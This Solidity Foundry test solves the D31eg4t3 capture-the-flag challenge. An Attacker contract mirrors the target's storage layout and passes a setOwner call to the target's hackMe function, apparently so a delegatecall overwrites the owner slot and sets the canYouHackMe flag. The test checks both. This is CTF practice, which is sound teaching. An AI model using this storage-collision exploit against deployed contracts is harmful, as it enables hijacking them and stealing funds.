// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {D31eg4t3} from "../src/D31eg4t3.sol";

contract Attacker {
    uint256[5] private __gap;
    address private owner;
    mapping(address => bool) private canYouHackMe;

    function hack(D31eg4t3 target) external {
        target.hackMe(
            abi.encodeWithSelector(Attacker.setOwner.selector, msg.sender)
        );
    }

    function setOwner(address _owner) external {
        owner = _owner;
        canYouHackMe[_owner] = true;
    }
}

contract D31eg4t3Test is Test {
    address private hacker = makeAddr("hacker");
    D31eg4t3 private challenge;

    function setUp() external {
        challenge = new D31eg4t3();
    }

    function test_hack() external {
        /**
            Objective of CTF

            Become the owner of the contract.
            Make canYouHackMe mapping to true for your own
            address.
         */
        vm.startPrank(hacker);
        Attacker attacker = new Attacker();
        attacker.hack(challenge);
        vm.stopPrank();

        assertEq(challenge.owner(), hacker);
        assertTrue(challenge.canYouHackMe(hacker));
    }
}
